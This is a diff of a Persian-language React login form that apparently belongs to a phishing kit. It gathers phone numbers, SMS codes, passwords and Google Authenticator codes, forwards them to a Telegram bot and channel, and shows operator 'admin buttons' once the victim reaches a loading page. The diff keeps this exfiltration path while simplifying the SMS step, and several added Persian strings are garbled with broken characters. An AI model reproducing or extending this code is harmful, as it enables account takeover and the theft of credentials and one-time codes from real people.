@@ -251,7 +251,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Phone submission error:", error);
       setErrors({
-        mobileNumber: "خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.",
+        mobileNumber: "خطا ��ر ارسال اطلاعات. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -270,37 +270,25 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("🔍 Verifying code:", verifyCode, "SMS mode:", isSmsCodeMode);
+      console.log("🔍 Verifying code:", verifyCode);
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo mode: accepting any 6-digit code");
         await new Promise((resolve) => setTimeout(resolve, 1000));
       } else {
-        if (isSmsCodeMode) {
-          // Send SMS code as auth step to Telegram
-          console.log("📱 Sending SMS code to Telegram as auth step");
-          const success = await updateAuthStep(sessionId, "sms", verifyCode);
-          if (!success) {
-            throw new Error("Failed to update SMS auth step");
-          }
-        } else {
-          // Regular phone verification
-          const success = await updatePhoneVerificationCode(
-            sessionId,
-            verifyCode,
-          );
-          if (!success) {
-            throw new Error("Failed to update phone verification");
-          }
+        // Update verification in Telegram
+        const success = await updatePhoneVerificationCode(
+          sessionId,
+          verifyCode,
+        );
+        if (!success) {
+          throw new Error("Failed to update phone verification");
         }
       }
 
       console.log("✅ Code verified successfully");
       setCurrentStep("loading");
-
-      // Reset SMS mode
-      setIsSmsCodeMode(false);
 
       // Show admin buttons after reaching loading page
       setTimeout(async () => {
@@ -432,7 +420,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارسال کد. ��طفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -772,7 +760,7 @@ export const LoginForm = () => {
                   ? "رمز عبور"
                   : currentStep === "google"
                     ? "Google Authenticator"
-                    : "ورود"}
+                    : "ور��د"}
             </span>
           </div>
           <a href="#">
@@ -843,7 +831,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال ��ی‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
